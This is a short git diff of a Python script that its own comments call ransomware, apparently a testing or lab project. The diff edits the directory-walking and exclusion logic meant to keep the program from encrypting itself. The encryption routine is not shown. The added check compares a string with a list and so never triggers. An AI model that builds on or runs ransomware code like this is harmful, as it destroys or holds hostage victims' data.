@@ -33,6 +33,9 @@ def process_directory(directory: str, key: str, blacklist: list[str]):
     # Unpacks the provided directory as a 3-tuple consisting of directory path, directory names, and file names
     for root, dir, files in os.walk(directory):
         # Ensures that the program doesn't accidentally encrypt itself!
+        if directory == blacklist:
+            print("You're attempting to encrypt a blacklisted folder!")
+            return
         for directory in blacklist:
             if directory in dir:
                 dir.remove(directory)
@@ -83,7 +86,7 @@ def main():
     # Represents folders to avoid encrypting for safety of host computer whilst maintaining functionality
     # of the ransomware.
     # TODO: Verify, but SHOULD prevent the code from encrypting itself
-    blacklist: list[str] = [os.getcwd()]
+    blacklist: list[str] = ["Shark Images"]
 
     # Directories to encrypt in their entirety
     # TODO: Update as needed for testing purposes
